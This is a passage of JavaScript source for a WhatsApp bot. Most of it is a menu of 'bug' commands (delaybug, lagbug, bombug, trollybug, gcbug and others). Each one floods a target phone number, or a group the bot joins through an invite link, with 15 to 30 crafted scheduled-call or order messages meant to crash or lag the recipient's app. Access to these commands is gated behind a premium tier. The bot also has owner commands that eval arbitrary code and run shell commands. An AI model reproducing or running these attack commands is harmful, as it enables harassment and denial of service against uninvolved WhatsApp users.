 await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'delaybug' : {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 6287715768324`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully Sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'docubug': {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 6287715768324`)
await loading()
if (args.length < 1) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 6287715768324`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'unlimitedbug' : {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 6287715768324`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'bombug': {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 6287715768324`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'lagbug' : {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 6287715768324`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
break
case 'trollybug': {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} number\nExample ${prefix+command} 6287715768324`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "6287715768324@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
XeonBotInc.relayMessage(victim, order.message, { messageId: order.key.id })
}
reply(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
}
break
case 'gcbug' : {
if (!isPremium) return reply(mess.prem)
 if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/CpUJUvcd7XN9WrIZApfBlb`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
case 'delaygcbug' :  {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/CpUJUvcd7XN9WrIZApfBlb`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext5
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
case 'laggcbug' :  {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/CpUJUvcd7XN9WrIZApfBlb`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
case 'bomgcbug' :  {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/CpUJUvcd7XN9WrIZApfBlb`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await haikal.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
case 'unlimitedgcbug' :  {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/CpUJUvcd7XN9WrIZApfBlb`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const xeonybug1 = xeontext3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
case 'trollygcbug' :  {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/CpUJUvcd7XN9WrIZApfBlb`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "6287715768324@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
XeonBotInc.relayMessage(xeongc, order.message, { messageId: order.key.id })
}
}
reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
case 'docugcbug' :  {
if (!isPremium) return reply(mess.prem)
if (!args[0]) return reply(`Use ${prefix+command} link\nExample ${prefix+command} https://chat.whatsapp.com/CpUJUvcd7XN9WrIZApfBlb`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let xeongc = await XeonBotInc.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
const xeonybug1 = `${xeontext1}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": xeonybug1,
}
}), { userJid: from, quoted : m})
XeonBotInc.relayMessage(xeongc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
reply(`*Successfully sent Bug To ${xeongc} Please pause for 3 minutes*`)
break
            case 'menu':
            case 'help':
            case 'alive':
            case '?':
            let hit = 0
                let mono = '```'
                let xeonmenuoh = `${mono}Hello ${pushname}
 ${xeonytimewisher} 😄
${readmore}
╭  🌷 ʙᴜɢ ᴍᴇɴᴜ 🌷
┆${hit+=1}. ${prefix}amountbug <amount>
┆${hit+=1}. ${prefix}pmbug <number>
┆${hit+=1}. ${prefix}delaybug <number>
┆${hit+=1}. ${prefix}trollybug <number>
┆${hit+=1}. ${prefix}docubug <number>
┆${hit+=1}. ${prefix}unlimitedbug <number>
┆${hit+=1}. ${prefix}bombug <number>
┆${hit+=1}. ${prefix}lagbug <number>
┆${hit+=1}. ${prefix}gcbug <Grup>
┆${hit+=1}. ${prefix}delaygcbug <Grup>
┆${hit+=1}. ${prefix}trollygcbug <Grup>
┆${hit+=1}. ${prefix}laggcbug <Grup>
┆${hit+=1}. ${prefix}bomgcbug <Grup>
┆${hit+=1}. ${prefix}unlimitedgcbug <Grup>
┆${hit+=1}. ${prefix}docugcbug <Grup>
╰
╭  🌸 ᴏᴡɴᴇʀ ᴍᴇɴᴜ 🌸
┆${hit+=1}. ${prefix}getsession
┆${hit+=1}. ${prefix}deletesession
┆${hit+=1}. ${prefix}join
┆${hit+=1}. ${prefix}shutdown  
┆${hit+=1}. ${prefix}restart
┆${hit+=1}. ${prefix}autoread 
┆${hit+=1}. ${prefix}autotyping 
┆${hit+=1}. ${prefix}autorecording 
┆${hit+=1}. ${prefix}autorecordtyp 
┆${hit+=1}. ${prefix}autobio 
┆${hit+=1}. ${prefix}autoswview 
┆${hit+=1}. ${prefix}mode 
┆${hit+=1}. ${prefix}block
┆${hit+=1}. ${prefix}unblock 
┆${hit+=1}. ${prefix}backup
┆${hit+=1}. ${prefix}getcase
┆${hit+=1}. ${prefix}addowner
┆${hit+=1}. ${prefix}delowner
╰
╭ ☄️ ɢʀᴏᴜᴘ ᴍᴇɴᴜ ☄️
┆${hit+=1}. ${prefix}closetime
┆${hit+=1}. ${prefix}opentime
┆${hit+=1}. ${prefix}kick
┆${hit+=1}. ${prefix}add
┆${hit+=1}. ${prefix}promote
┆${hit+=1}. ${prefix}demote
┆${hit+=1}. ${prefix}setdesc
┆${hit+=1}. ${prefix}setppgc
┆${hit+=1}. ${prefix}tagall
┆${hit+=1}. ${prefix}hidetag
┆${hit+=1}. ${prefix}totag
┆${hit+=1}. ${prefix}group 
┆${hit+=1}. ${prefix}editinfo
┆${hit+=1}. ${prefix}linkgc
┆${hit+=1}. ${prefix}revoke
┆${hit+=1}. ${prefix}listonline
╰
╭  🕹️ ᴍᴀɪɴ ᴍᴇɴᴜ 🕹️
┆${hit+=1}. ${prefix}menu
┆${hit+=1}. ${prefix}buypremium
┆${hit+=1}. ${prefix}runtime
┆${hit+=1}. ${prefix}script
┆${hit+=1}. ${prefix}donate
┆${hit+=1}. ${prefix}owner
╰
╭ 🎡 ᴄᴏɴᴠᴇʀᴛ ᴍᴇɴᴜ 🎡
┆${hit+=1}. ${prefix}sticker
┆${hit+=1}. ${prefix}qc
┆${hit+=1}. ${prefix}smeme
┆${hit+=1}. ${prefix}take
┆${hit+=1}. ${prefix}toimage
┆${hit+=1}. ${prefix}tovideo
┆${hit+=1}. ${prefix}toaudio
┆${hit+=1}. ${prefix}tomp3
┆${hit+=1}. ${prefix}tovn
┆${hit+=1}. ${prefix}togif
┆${hit+=1}. ${prefix}tourl
┆${hit+=1}. ${prefix}toqr
┆${hit+=1}. ${prefix}toviewonce
┆${hit+=1}. ${prefix}fliptext
┆${hit+=1}. ${prefix}emojimix
╰
╭ 📂 ᴅᴀᴛᴀʙᴀsᴇ ᴍᴇɴᴜ 📂
┆${hit+=1}. ${prefix}addvideo
┆${hit+=1}. ${prefix}addimage
┆${hit+=1}. ${prefix}addsticker
┆${hit+=1}. ${prefix}addvn
┆${hit+=1}. ${prefix}addzip
┆${hit+=1}. ${prefix}addapk
┆${hit+=1}. ${prefix}addpdf
┆${hit+=1}. ${prefix}delvideo
┆${hit+=1}. ${prefix}delimage
┆${hit+=1}. ${prefix}delsticker
┆${hit+=1}. ${prefix}delvn
┆${hit+=1}. ${prefix}delzip
┆${hit+=1}. ${prefix}delapk
┆${hit+=1}. ${prefix}delpdf
┆${hit+=1}. ${prefix}listvideo
┆${hit+=1}. ${prefix}listimage
┆${hit+=1}. ${prefix}liststicker
┆${hit+=1}. ${prefix}listvn
┆${hit+=1}. ${prefix}listzip
┆${hit+=1}. ${prefix}listapk
┆${hit+=1}. ${prefix}listpdf
╰

╭ 🌟 ᴅᴏᴡɴ ᴍᴇɴᴜ 🌟
┆${hit+=1}. ${prefix}play
┆${hit+=1}. ${prefix}ytmp3
┆${hit+=1}. ${prefix}ytmp4
┆${hit+=1}. ${prefix}sound1 - sound161
╰${mono}`
sendMsg(m.chat, {
                    video: fs.readFileSync('./XeonMedia/thumb2.mp4'),
                    gifPlayback: true,
                    gifAttribution: ~~(Math.random() * 2),
                    caption: xeonmenuoh,
                    contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${botname}`,
                                body: `Bot Created By ${ownername}`,
                                thumbnail: fs.readFileSync('./XeonMedia/thumb.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                }, {
                    quoted: m
                })
if (typemenu === 'v1') {
                    sendMsg(m.chat, {
                        image: fs.readFileSync('./XeonMedia/thumb.jpg'),
                        caption: xeonmenuoh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    sendMsg(m.chat, {
                        text: xeonmenuoh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${botname}`,
                                body: `Bot Created By ${ownername}`,
                                thumbnail: fs.readFileSync('./XeonMedia/thumb.jpg'),
                                sourceUrl: global.link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    sendMsg(m.chat, {
                        video: fs.readFileSync('./XeonMedia/thumb2.mp4'),
                        caption: xeonmenuoh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    XeonBotInc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xeonmenuoh
                        }
                    }, {})
                }
                break
                break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return reply(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return reply(bang)
                    }
                    try {
                        reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
if (!isCreator) return reply(`KAU BUKAN OWNER 😃`)
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!isCreator) return reply(`KAU BUKAN OWNER 😃`)
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
                if (budy.startsWith('$')) {
                    if (!isCreator) return reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return reply(err)
                        if (stdout) return reply(stdout)
                    })
                }
        }
    } catch (err) {
        XeonBotInc.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("Socket connection timeout")) return
if (e.includes("item-not-found")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})
